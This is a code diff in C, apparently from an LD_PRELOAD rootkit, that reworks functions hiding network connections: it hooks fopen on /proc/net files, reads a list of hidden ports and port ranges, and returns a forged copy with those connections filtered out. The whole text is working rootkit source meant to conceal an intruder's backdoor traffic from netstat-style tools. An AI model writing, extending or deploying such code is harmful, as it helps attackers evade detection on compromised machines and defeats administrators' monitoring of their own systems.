@@ -1,8 +1,4 @@
 int is_hidden_port(int port){
-    for(int i = 0; i != BDVLPORTS_SIZE; i++)
-        if(port == bdvlports[i])
-            return 1;
-
     FILE *fp;
     char buf[13], // max len line can be is len("xxxxx-xxxxx")
          *buf_tok = NULL;
@@ -15,7 +11,7 @@ int is_hidden_port(int port){
     if(fp == NULL) return 0;
 
     while(fgets(buf, sizeof(buf), fp) != NULL){
-        buf[strlen(buf) - 1] = '\0';
+        buf[strlen(buf)-1] = '\0';
 
         if(strstr(buf, "-")){   /* hide specific port ranges */
             /* get the lowest and highest ports within the range... */
@@ -38,7 +34,6 @@ int is_hidden_port(int port){
         }
     }
 
-    memset(buf, 0, strlen(buf));
     fclose(fp);
     return hidden_status;
 }
@@ -53,8 +48,6 @@ int secret_connection(char line[]){
     sscanf(line, fmt, &d, laddr, &lport, raddr, &rport, &state, &txq,
                              &rxq, &t_run, &t_len, &retr, &uid, &tout, &inode,
                              etc);
-    memset(line, 0, strlen(line));
-
 
     if(is_hidden_port(lport) || is_hidden_port(rport))
         return 1;
@@ -94,21 +87,23 @@ int hideport_alive(void){
 }
 
 FILE *forge_procnet(const char *pathname){
-    FILE *tmp = tmpfile(), *pnt;
+    FILE *tmp, *fp;
     char line[LINE_MAX];
 
     hook(CFOPEN);
-    pnt = call(CFOPEN, pathname, "r");
-    if(pnt == NULL) return NULL;
-    if(tmp == NULL) return pnt;
+    fp = call(CFOPEN, pathname, "r");
+    if(fp == NULL)
+        return NULL;
 
-    
-    /* begin reading entries from said procnet file */
-    while(fgets(line, sizeof(line), pnt) != NULL)
+    tmp = tmpfile();
+    if(tmp == NULL)
+        return fp;
+
+    while(fgets(line, sizeof(line), fp) != NULL)
         if(!secret_connection(line))
             fputs(line, tmp);
 
-    fclose(pnt);
+    fclose(fp);
     fseek(tmp, 0, SEEK_SET);
     return tmp;
 }
